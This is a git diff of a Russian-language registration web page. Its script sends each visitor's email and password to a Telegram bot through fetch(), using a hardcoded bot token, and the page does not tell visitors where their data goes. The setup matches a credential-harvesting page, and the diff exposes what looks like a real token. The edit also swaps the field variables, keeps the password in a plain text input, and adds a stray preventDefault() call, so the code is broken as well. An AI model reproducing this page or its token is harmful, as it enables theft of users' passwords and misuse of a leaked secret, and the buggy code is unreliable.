@@ -3,15 +3,31 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Регистрация</title>
+    <style>
+      form{
+        display: flex;
+        flex-direction: column;
+        width: 250px;
+        margin-left: 100px;
+      }
+      h1{
+        margin-left: 100px;
+      }
+      button{
+        margin-top: 10px;
+        padding: 10px;
+        background: green;
+      }
+    </style>
 </head>
 <body>
     <h1>Регистрация</h1>
     <form id="registrationForm">
-        <label for="username">email:</label>
-        <input type="email" id="username" name="username" required>
+        <p>Email</p>
+        <input type="text" id="email" name="username" required>
         <br>
-        <label for="email">пароль:</label>
-        <input type="text" id="email" name="email" required>
+        <p>Password</p>
+        <input type="text" id="pass" name="email" required>
         <br>
         <button type="submit">Зарегистрироваться</button>
     </form>
@@ -20,7 +36,7 @@
         document.getElementById('registrationForm').addEventListener('submit', function(event) {
             event.preventDefault(); 
 
-            const username = document.getElementById('username').value;
+            const username = document.getElementById('pass').value;
             const email = document.getElementById('email').value;
 
             const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g';
@@ -32,6 +48,7 @@
             fetch(url) 
                 .then(response => {
                     if (response.ok) {
+                      preventDefault()
                         alert('Данные успешно отправлены в Telegram!');
                     } else {
                         alert('Ошибка при отправке данных.');
